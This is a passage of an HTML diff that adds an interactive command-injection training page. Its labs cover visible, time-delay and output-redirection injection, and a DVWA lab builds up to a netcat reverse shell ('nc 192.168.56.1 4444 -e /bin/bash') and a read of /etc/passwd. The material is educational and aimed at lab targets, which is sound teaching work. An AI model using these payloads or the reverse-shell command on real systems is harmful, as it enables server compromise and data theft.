+                    <p class="module-subtitle">The critical vulnerability explained</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">📖 Definition</div>
+                        <div class="section-content">
+                            <div class="alert alert-danger">
+                                <div class="alert-icon">!</div>
+                                <div>
+                                    <strong>OS Command Injection</strong> occurs when an application executes operating system commands using unsanitized user input, allowing attackers to run additional or arbitrary commands on the server.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎯 Attack Chain</div>
+                        <div class="section-content">
+                            <div style="margin: 20px 0; color: var(--text-dim); font-size: 13px; line-height: 2;">
+                                <div><strong style="color: var(--warning);">1. Attacker</strong> identifies a vulnerable parameter</div>
+                                <div><strong style="color: var(--warning);">2. Attacker</strong> injects OS command using separators (;, &&, |)</div>
+                                <div><strong style="color: var(--warning);">3. Application</strong> concatenates attacker input</div>
+                                <div><strong style="color: var(--warning);">4. OS</strong> interprets the full string as multiple commands</div>
+                                <div><strong style="color: var(--warning);">5. Attacker</strong> gains arbitrary code execution</div>
+                                <div><strong style="color: var(--warning);">6. Server</strong> is compromised</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">📊 Severity & Impact</div>
+                        <div class="section-content">
+                            <div class="table-container">
+                                <table>
+                                    <tr>
+                                        <th>Rating</th>
+                                        <th>Value</th>
+                                        <th>Description</th>
+                                    </tr>
+                                    <tr>
+                                        <td style="color: var(--danger);">CVSS Score</td>
+                                        <td style="color: var(--danger);">9.0 - 10.0</td>
+                                        <td>Critical vulnerability</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="color: var(--danger);">OWASP Top 10</td>
+                                        <td style="color: var(--danger);">A1/A03</td>
+                                        <td>High priority vulnerability</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="color: var(--warning);">Impact</td>
+                                        <td style="color: var(--warning);">Critical</td>
+                                        <td>Complete system compromise</td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🔥 Why It's Critical</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Impact of Successful Exploitation:</div>
+                                <p>• <strong style="color: var(--danger);">Remote Code Execution (RCE)</strong> - Execute arbitrary commands</p>
+                                <p>• <strong style="color: var(--danger);">Data Breach</strong> - Read sensitive files (/etc/passwd, database configs)</p>
+                                <p>• <strong style="color: var(--danger);">System Compromise</strong> - Full server access</p>
+                                <p>• <strong style="color: var(--danger);">Lateral Movement</strong> - Attack other systems on the network</p>
+                                <p>• <strong style="color: var(--danger);">Persistence</strong> - Install backdoors, rootkits</p>
+                                <p>• <strong style="color: var(--danger);">Denial of Service</strong> - Crash or disable services</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- MODULE 7 -->
+                <div class="module">
+                    <h1 class="module-title">🔑 Why OS Command Injection Works</h1>
+                    <p class="module-subtitle">Understanding the mechanics of the vulnerability</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧠 Core Reason</div>
+                        <div class="section-content">
+                            <div class="alert alert-info">
+                                <div class="alert-icon">ℹ️</div>
+                                <div>
+                                    OS Command Injection works because:<br>
+                                    <strong>1.</strong> OS shells interpret special characters as command separators<br>
+                                    <strong>2.</strong> Applications concatenate user input directly<br>
+                                    <strong>3.</strong> The shell sees multiple commands instead of one
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">⚙️ Command Separators</div>
+                        <div class="section-content">
+                            <div class="table-container">
+                                <table>
+                                    <tr>
+                                        <th>Symbol</th>
+                                        <th>Meaning</th>
+                                        <th>Execution Logic</th>
+                                        <th>Example</th>
+                                    </tr>
+                                    <tr>
+                                        <td><span style="color: var(--warning);">;</span></td>
+                                        <td>End of command</td>
+                                        <td>Execute next command always</td>
+                                        <td>cmd1 ; cmd2</td>
+                                    </tr>
+                                    <tr>
+                                        <td><span style="color: var(--warning);">&&</span></td>
+                                        <td>Logical AND</td>
+                                        <td>Execute next only if previous succeeds</td>
+                                        <td>cmd1 && cmd2</td>
+                                    </tr>
+                                    <tr>
+                                        <td><span style="color: var(--warning);">||</span></td>
+                                        <td>Logical OR</td>
+                                        <td>Execute next only if previous fails</td>
+                                        <td>cmd1 || cmd2</td>
+                                    </tr>
+                                    <tr>
+                                        <td><span style="color: var(--warning);">|</span></td>
+                                        <td>Pipe</td>
+                                        <td>Send output of cmd1 to cmd2</td>
+                                        <td>cmd1 | cmd2</td>
+                                    </tr>
+                                    <tr>
+                                        <td><span style="color: var(--warning);">$( )</span></td>
+                                        <td>Substitution</td>
+                                        <td>Execute command, use output</td>
+                                        <td>echo $(whoami)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><span style="color: var(--warning);">`  `</span></td>
+                                        <td>Backticks</td>
+                                        <td>Execute command, use output</td>
+                                        <td>echo `whoami`</td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧪 Interactive Separator Demo</div>
+                        <div class="section-content">
+                            <p style="margin-bottom: 15px;">Observe how separators create multiple command execution:</p>
+                            <div class="input-group">
+                                <label class="input-label">Select a separator to visualize:</label>
+                                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;">
+                                    <button class="btn btn-secondary" onclick="showSeparatorDemo(';')">; (Semicolon)</button>
+                                    <button class="btn btn-secondary" onclick="showSeparatorDemo('&&')">&&  (AND)</button>
+                                    <button class="btn btn-secondary" onclick="showSeparatorDemo('||');">|| (OR)</button>
+                                    <button class="btn btn-secondary" onclick="showSeparatorDemo('|');">| (Pipe)</button>
+                                    <button class="btn btn-secondary" onclick="showSeparatorDemo('$()');">$( ) (Subst.)</button>
+                                </div>
+                            </div>
+                            <div id="separator-demo" style="margin-top: 20px; display: none;">
+                                <div class="terminal">
+                                    <div class="terminal-header">
+                                        <div class="terminal-btn terminal-btn-red"></div>
+                                        <div class="terminal-btn terminal-btn-yellow"></div>
+                                        <div class="terminal-btn terminal-btn-green"></div>
+                                        <div class="terminal-title">$ Demo</div>
+                                    </div>
+                                    <div class="terminal-content" id="separator-content"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎯 Real Injection Scenario</div>
+                        <div class="section-content">
+                            <p style="margin-bottom: 15px;">Normal ping command:</p>
+                            <div class="code-block">
+ping -c 1 8.8.8.8
+                            </div>
+
+                            <p style="margin: 20px 0 15px 0;">Attacker injects <span style="color: var(--danger);">; whoami</span>:</p>
+                            <div class="code-block">
+ping -c 1 <span style="color: var(--danger);">8.8.8.8; whoami</span>
+                            </div>
+
+                            <p style="margin: 20px 0 15px 0;">OS interprets as two commands:</p>
+                            <div class="terminal">
+                                <div class="terminal-content">
+                                    <div class="terminal-line">
+                                        <span class="terminal-prompt">$</span>
+                                        <span class="terminal-command">ping -c 1 8.8.8.8</span>
+                                    </div>
+                                    <div class="terminal-line">
+                                        <span class="terminal-output">PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.</span>
+                                    </div>
+                                    <div class="terminal-line">
+                                        <span class="terminal-output">64 bytes from 8.8.8.8: icmp_seq=1 ttl=119 time=15.2 ms</span>
+                                    </div>
+                                    <div class="terminal-line" style="margin-top: 10px;">
+                                        <span class="terminal-prompt">$</span>
+                                        <span class="terminal-command" style="color: var(--danger);">whoami</span>
+                                    </div>
+                                    <div class="terminal-line">
+                                        <span class="terminal-success">www-data</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 1 -->
+                <div class="module">
+                    <h1 class="module-title">🔴 Lab 1: Visible Command Injection</h1>
+                    <p class="module-subtitle">Exploiting and understanding your first injection</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎯 Lab Objective</div>
+                        <div class="section-content">
+                            <div class="alert alert-info">
+                                <div class="alert-icon">ℹ️</div>
+                                <div>
+                                    <strong>Goal:</strong> Execute the <span style="color: var(--warning);">whoami</span> command through command injection and identify the server user.<br>
+                                    <strong>Vulnerability:</strong> Stock check API concatenates user input directly into OS command.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">📋 Step-by-Step Exploitation</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Step 1: Identify the Vulnerable Parameters</div>
+                                <p style="margin: 10px 0;">The vulnerable API endpoint is:</p>
+                                <div class="code-block">
+GET /api/stock?productId=1&storeId=1
+                                </div>
+                                <p style="margin: 10px 0; color: var(--text-dim);">Both <span style="color: var(--warning);">productId</span> and <span style="color: var(--warning);">storeId</span> are user-controlled and injectable.</p>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 2: Craft the Injection Payload</div>
+                                <p style="margin: 10px 0;">We'll use the semicolon separator to execute <span style="color: var(--warning);">whoami</span>:</p>
+                                <div class="code-block" style="color: var(--danger);">
+; whoami
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 3: Inject into Parameter</div>
+                                <p style="margin: 10px 0;">Inject the payload into <span style="color: var(--warning);">productId</span>:</p>
+                                <div class="code-block">
+GET /api/stock?productId=<span style="color: var(--danger);">1; whoami</span>&storeId=1
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 4: Observe the Response</div>
+                                <p style="margin: 10px 0;">The server executes:</p>
+                                <div class="code-block">
+check_stock --productId=<span style="color: var(--danger);">1; whoami</span> --storeId=1
+                                </div>
+                                <p style="margin: 10px 0; color: var(--text-dim);">Which is interpreted as:</p>
+                                <div class="terminal">
+                                    <div class="terminal-content">
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">$</span>
+                                            <span class="terminal-command">check_stock --productId=1</span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-output">Invalid product ID</span>
+                                        </div>
+                                        <div class="terminal-line" style="margin-top: 10px;">
+                                            <span class="terminal-prompt">$</span>
+                                            <span class="terminal-command" style="color: var(--danger);">whoami</span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-success">www-data</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧪 Interactive Lab Simulator</div>
+                        <div class="section-content">
+                            <div class="burp-container">
+                                <div class="burp-tabs">
+                                    <div class="burp-tab active" onclick="switchBurpTab(event, 'request1')">Request</div>
+                                    <div class="burp-tab" onclick="switchBurpTab(event, 'response1')">Response</div>
+                                </div>
+
+                                <div id="request1" class="burp-content active">
+                                    <div class="request-line">GET /api/stock HTTP/1.1</div>
+                                    <div class="header-line">Host: vulnerable-app.local</div>
+                                    <div class="header-line">User-Agent: Mozilla/5.0</div>
+                                    <div class="header-line">Connection: close</div>
+                                    <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--border);">
+                                        <div style="color: var(--info); margin-bottom: 10px;">Parameters:</div>
+                                        <div class="param-row">
+                                            <div class="param-key">productId</div>
+                                            <div class="param-value" id="param1-value">1</div>
+                                        </div>
+                                        <div class="param-row">
+                                            <div class="param-key">storeId</div>
+                                            <div class="param-value" id="param2-value">1</div>
+                                        </div>
+                                    </div>
+
+                                    <div style="margin-top: 20px;">
+                                        <label class="input-label" style="margin-bottom: 10px;">Inject payload (try: 1; whoami):</label>
+                                        <input class="input-field" id="lab1-injection" type="text" placeholder="Enter injection">
+                                        <div style="margin-top: 10px; display: flex; gap: 10px;">
+                                            <button class="btn" onclick="simulateLab1()">Send Request</button>
+                                            <button class="btn btn-secondary" onclick="resetLab1()">Reset</button>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div id="response1" class="burp-content">
+                                    <div class="request-line">HTTP/1.1 200 OK</div>
+                                    <div class="header-line">Content-Type: text/plain</div>
+                                    <div style="margin-top: 20px; color: var(--text); line-height: 1.8;" id="lab1-response">
+                                        <div style="color: var(--text-dim);">Response will appear here...</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">💡 Why This Attack Worked</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Root Cause Analysis:</div>
+                                <p><strong style="color: var(--warning);">1. Input Not Validated:</strong> Application accepts any string for productId</p>
+                                <p><strong style="color: var(--warning);">2. Direct Concatenation:</strong> User input directly inserted into command string</p>
+                                <p><strong style="color: var(--warning);">3. Shell Interpretation:</strong> OS shell sees the semicolon and treats it as separator</p>
+                                <p><strong style="color: var(--warning);">4. Command Execution:</strong> Both original and injected commands execute</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎓 Key Takeaway</div>
+                        <div class="section-content">
+                            <div class="alert alert-danger">
+                                <div class="alert-icon">!</div>
+                                <div>
+                                    <strong>Command separators turn user input into executable instructions.</strong> A single semicolon can grant attackers arbitrary code execution on the server.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 2 -->
+                <div class="module">
+                    <h1 class="module-title">🟠 Lab 2: Blind Injection with Time Delay</h1>
+                    <p class="module-subtitle">Exploiting vulnerabilities without visible output</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎯 Lab Objective</div>
+                        <div class="section-content">
+                            <div class="alert alert-info">
+                                <div class="alert-icon">ℹ️</div>
+                                <div>
+                                    <strong>Goal:</strong> Cause a 10-second delay in the server response to confirm blind command execution.<br>
+                                    <strong>Challenge:</strong> Command output is NOT returned to the user, so we must detect execution via side effects.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">💡 What Is Blind Injection?</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">In Blind Injection:</div>
+                                <p>• <strong>Command DOES execute</strong> on the server</p>
+                                <p>• <strong>Output is NOT shown</strong> to the attacker</p>
+                                <p>• <strong>Attacker must infer</strong> execution via side effects</p>
+                                <p>• <strong>Time delays</strong> are a common detection method</p>
+                            </div>
+
+                            <div class="subsection" style="margin-top: 20px;">
+                                <div class="subsection-title">Why Time Delays Work:</div>
+                                <p>If an attacker injects <span style="color: var(--warning);">sleep 10</span> and the response takes 10 seconds longer than normal, it confirms execution.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">📋 Exploitation Steps</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Step 1: Identify the Vulnerable Endpoint</div>
+                                <p>The vulnerable feedback form endpoint:</p>
+                                <div class="code-block">
+POST /api/feedback HTTP/1.1
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 2: Test Each Parameter</div>
+                                <p>Parameters to test:</p>
+                                <div class="code-block">
+name=
+email=
+subject=
+message=
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 3: Craft Delay Payload</div>
+                                <p>Time-based detection payload:</p>
+                                <div class="code-block" style="color: var(--warning);">
+; sleep 10
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 4: Measure Response Time</div>
+                                <p>Monitor how long the server takes to respond. If it delays by ~10 seconds, injection is confirmed.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧪 Interactive Lab Simulator</div>
+                        <div class="section-content">
+                            <div style="margin-bottom: 20px;">
+                                <label class="input-label">Test blind injection with time delay:</label>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                                    <div>
+                                        <p style="color: var(--text-dim); font-size: 12px; margin-bottom: 8px;">Normal Request (baseline):</p>
+                                        <button class="btn btn-secondary" onclick="testNormalRequest()">Send Normal</button>
+                                    </div>
+                                    <div>
+                                        <p style="color: var(--text-dim); font-size: 12px; margin-bottom: 8px;">Injected Request (with delay):</p>
+                                        <button class="btn btn-danger" onclick="testBlindInjection()">Send Injection</button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div id="lab2-results" style="margin-top: 20px; display: none;">
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                                    <div>
+                                        <h4 style="color: var(--text); margin-bottom: 10px;">Normal Request</h4>
+                                        <div class="terminal">
+                                            <div class="terminal-content">
+                                                <div class="terminal-line">
+                                                    <span class="terminal-prompt">→</span>
+                                                    <span class="terminal-output">Time: <span id="normal-time">0ms</span></span>
+                                                </div>
+                                                <div class="terminal-line">
+                                                    <span class="terminal-prompt">→</span>
+                                                    <span class="terminal-output">Status: <span style="color: var(--success);">Success</span></span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <h4 style="color: var(--text); margin-bottom: 10px;">Injected Request</h4>
+                                        <div class="terminal">
+                                            <div class="terminal-content">
+                                                <div class="terminal-line">
+                                                    <span class="terminal-prompt">→</span>
+                                                    <span class="terminal-output">Time: <span id="injection-time">0ms</span></span>
+                                                </div>
+                                                <div class="terminal-line">
+                                                    <span class="terminal-prompt">→</span>
+                                                    <span class="terminal-output">Status: <span id="injection-status">Waiting...</span></span>
+                                                </div>
+                                                <div class="terminal-line" style="margin-top: 10px;">
+                                                    <span class="terminal-prompt">→</span>
+                                                    <span class="terminal-output" id="injection-analysis"></span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎓 Key Insights</div>
+                        <div class="section-content">
+                            <div class="alert alert-warning">
+                                <div class="alert-icon">⚠️</div>
+                                <div>
+                                    <strong>Blind vulnerabilities are still critical.</strong> Even without visible output, attackers can:<br>
+                                    • Confirm code execution via time delays<br>
+                                    • Extract data via DNS or out-of-band channels<br>
+                                    • Establish reverse shells for full control<br>
+                                    • No output ≠ No vulnerability
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 3 -->
+                <div class="module">
+                    <h1 class="module-title">🟡 Lab 3: Blind Injection with Output Redirection</h1>
+                    <p class="module-subtitle">Extracting data from blind injection through file writing</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎯 Lab Objective</div>
+                        <div class="section-content">
+                            <div class="alert alert-info">
+                                <div class="alert-icon">ℹ️</div>
+                                <div>
+                                    <strong>Goal:</strong> Redirect command output to a file and retrieve it via HTTP.<br>
+                                    <strong>Technique:</strong> Write to a web-accessible directory, then fetch the file.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">💡 Output Redirection Technique</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">What Is Output Redirection?</div>
+                                <p>The <span style="color: var(--warning);">></span> operator sends command output to a file instead of the terminal:</p>
+                                <div class="code-block">
+whoami > /tmp/output.txt
+
+# Before: whoami output shown on screen
+# After: whoami output written to file
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Why This Works in This Lab:</div>
+                                <p>1. Application has write access to <span style="color: var(--warning);">/var/www/html/images/</span></p>
+                                <p>2. This directory is served via HTTP (web-accessible)</p>
+                                <p>3. Attacker writes command output to a file in this directory</p>
+                                <p>4. Attacker retrieves the file via normal HTTP request</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">📋 Exploitation Steps</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Step 1: Identify Writable Directory</div>
+                                <p>The web app serves images from:</p>
+                                <div class="code-block">
+/var/www/html/images/
+
+This directory is:
+✓ Writable by the web application
+✓ Accessible via HTTP GET requests
+✓ Perfect for exfiltration
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 2: Craft Output Redirection Payload</div>
+                                <p>Redirect <span style="color: var(--warning);">whoami</span> output to a file:</p>
+                                <div class="code-block" style="color: var(--warning);">
+; whoami > /var/www/html/images/output.txt
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 3: Inject into Vulnerable Parameter</div>
+                                <p>Inject into the email field:</p>
+                                <div class="code-block">
+email=attacker@test.com<span style="color: var(--danger);">; whoami > /var/www/html/images/output.txt</span>
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 4: Retrieve the Output File</div>
+                                <p>Access the file via HTTP:</p>
+                                <div class="code-block">
+GET /images/output.txt HTTP/1.1
+
+Response:
+www-data
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧪 Interactive Lab Simulator</div>
+                        <div class="section-content">
+                            <div class="burp-container">
+                                <div class="burp-tabs">
+                                    <div class="burp-tab active" onclick="switchBurpTab(event, 'lab3-step1')">Step 1: Injection</div>
+                                    <div class="burp-tab" onclick="switchBurpTab(event, 'lab3-step2')">Step 2: File Access</div>
+                                    <div class="burp-tab" onclick="switchBurpTab(event, 'lab3-step3')">Step 3: Output</div>
+                                </div>
+
+                                <div id="lab3-step1" class="burp-content active">
+                                    <h4 style="color: var(--info); margin-bottom: 15px;">POST Request - Inject Payload</h4>
+                                    <p style="margin-bottom: 15px;">Enter your injection payload:</p>
+                                    <div class="input-group">
+                                        <input class="input-field" id="lab3-email" type="text" placeholder="E.g., test@test.com; whoami > /var/www/html/images/output.txt">
+                                        <button class="btn" onclick="executeLab3Step1()">Send Injection</button>
+                                    </div>
+                                    <div id="lab3-step1-result" style="margin-top: 15px; display: none;">
+                                        <div class="alert alert-success">
+                                            <div class="alert-icon">✓</div>
+                                            <div>Injection sent successfully. Command executed on server.</div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div id="lab3-step2" class="burp-content">
+                                    <h4 style="color: var(--info); margin-bottom: 15px;">GET Request - Access Output File</h4>
+                                    <p style="margin-bottom: 15px;">Retrieve the output file via HTTP:</p>
+                                    <div class="code-block">
+GET /images/output.txt HTTP/1.1
+Host: vulnerable-app.local
+                                    </div>
+                                    <button class="btn" onclick="executeLab3Step2()" style="margin-top: 15px;">Fetch File</button>
+                                    <div id="lab3-step2-result" style="margin-top: 15px; display: none;">
+                                        <div class="alert alert-success">
+                                            <div class="alert-icon">✓</div>
+                                            <div>File retrieved successfully!</div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div id="lab3-step3" class="burp-content">
+                                    <h4 style="color: var(--info); margin-bottom: 15px;">File Contents</h4>
+                                    <div class="terminal">
+                                        <div class="terminal-header">
+                                            <div class="terminal-btn terminal-btn-red"></div>
+                                            <div class="terminal-btn terminal-btn-yellow"></div>
+                                            <div class="terminal-btn terminal-btn-green"></div>
+                                            <div class="terminal-title">output.txt</div>
+                                        </div>
+                                        <div class="terminal-content" id="lab3-output">
+                                            <div style="color: var(--text-dim);">Output will appear after step 2...</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎓 Why This Is Powerful</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Data Exfiltration Path:</div>
+                                <p><strong style="color: var(--warning);">1.</strong> Attacker executes command secretly (no output)</p>
+                                <p><strong style="color: var(--warning);">2.</strong> Output redirected to web-accessible file</p>
+                                <p><strong style="color: var(--warning);">3.</strong> Attacker retrieves file via normal HTTP request</p>
+                                <p><strong style="color: var(--warning);">4.</strong> Application logs show legitimate image requests</p>
+                                <p><strong style="color: var(--warning);">5.</strong> Attacker gains complete visibility into server</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-danger">
+                        <div class="alert-icon">!</div>
+                        <div>
+                            <strong>Real-World Attack:</strong> Attackers can read <span style="color: var(--warning);">/etc/passwd</span>, database configs, API keys, and more using this technique.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 4 -->
+                <div class="module">
+                    <h1 class="module-title">🔴 Lab 4: DVWA RCE & Reverse Shell</h1>
+                    <p class="module-subtitle">From injection to complete server compromise</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎯 Lab Objective</div>
+                        <div class="section-content">
+                            <div class="alert alert-danger">
+                                <div class="alert-icon">!</div>
+                                <div>
+                                    <strong>Goal:</strong> Exploit DVWA Command Injection vulnerability to establish a reverse shell.<br>
+                                    <strong>Outcome:</strong> Complete interactive access to server's command line.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">💡 What Is a Reverse Shell?</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Definition:</div>
+                                <p>A reverse shell is when the compromised server initiates a connection back to the attacker, giving the attacker an interactive shell on the server.</p>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Normal vs Reverse Shell:</div>
+                                <table>
+                                    <tr>
+                                        <th>Type</th>
+                                        <th>Connection Direction</th>
+                                        <th>Who Initiates?</th>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Normal Shell</strong></td>
+                                        <td>Client → Server (SSH)</td>
+                                        <td>User connects to server</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Reverse Shell</strong></td>
+                                        <td>Server → Client (Attack IP)</td>
+                                        <td>Server connects to attacker</td>
+                                    </tr>
+                                </table>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Why Reverse Shells Are Powerful:</div>
+                                <p>• Server bypasses firewalls by initiating outbound connection</p>
+                                <p>• Attacker doesn't need direct access to server</p>
+                                <p>• Interactive access allows complex attacks</p>
+                                <p>• Can establish persistence and lateral movement</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">📋 Exploitation Process</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Step 1: Access DVWA Command Injection Module</div>
+                                <div class="code-block">
+1. Open DVWA in browser
+2. Login with admin/password
+3. Navigate to: Command Injection
+4. Set Security Level to: LOW
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 2: Verify Basic Injection (LOW Security)</div>
+                                <p>Input field asks for IP address:</p>
+                                <div class="code-block">
+Payload: 192.168.56.102 && whoami
+Expected output: ping result + www-data
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 3: Establish Reverse Shell</div>
+                                <p><strong style="color: var(--warning);">On Attacker Machine (Kali):</strong></p>
+                                <div class="code-block">
+nc -lvnp 4444
+
+-l    = Listen
+-v    = Verbose
+-n    = No DNS
+-p    = Port 4444
+                                </div>
+
+                                <p style="margin-top: 20px;"><strong style="color: var(--warning);">On DVWA Input Field:</strong></p>
+                                <div class="code-block" style="color: var(--danger);">
+192.168.56.102 && nc 192.168.56.1 4444 -e /bin/bash
+
+Where:
+192.168.56.102 = DVWA server
+192.168.56.1   = Attacker Kali IP
+4444           = Listening port
+-e /bin/bash   = Execute bash shell
+                                </div>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">Step 4: Gain Interactive Access</div>
+                                <p>On the attacker's netcat listener, you now have a shell:</p>
+                                <div class="terminal">
+                                    <div class="terminal-header">
+                                        <div class="terminal-btn terminal-btn-red"></div>
+                                        <div class="terminal-btn terminal-btn-yellow"></div>
+                                        <div class="terminal-btn terminal-btn-green"></div>
+                                        <div class="terminal-title">$ Reverse Shell Connected</div>
+                                    </div>
+                                    <div class="terminal-content">
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">$</span>
+                                            <span class="terminal-command">whoami</span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-success">www-data</span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">$</span>
+                                            <span class="terminal-command">id</span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-success">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">$</span>
+                                            <span class="terminal-command">cat /etc/passwd | head -5</span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-success">root:x:0:0:root:/root:/bin/bash</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧪 Security Level Progression</div>
+                        <div class="section-content">
+                            <div class="table-container">
+                                <table>
+                                    <tr>
+                                        <th>Level</th>
+                                        <th>Protection</th>
+                                        <th>Exploitation Difficulty</th>
+                                        <th>Status</th>
+                                    </tr>
+                                    <tr>
+                                        <td><strong style="color: var(--danger);">LOW</strong></td>
+                                        <td>None - Direct concatenation</td>
+                                        <td>✅ Easy - Simple injection</td>
+                                        <td>Vulnerable</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong style="color: var(--warning);">MEDIUM</strong></td>
+                                        <td>Blacklist filtering (weak)</td>
+                                        <td>⚠️ Medium - Bypass filters</td>
+                                        <td>Bypassable</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong style="color: var(--success);">HIGH</strong></td>
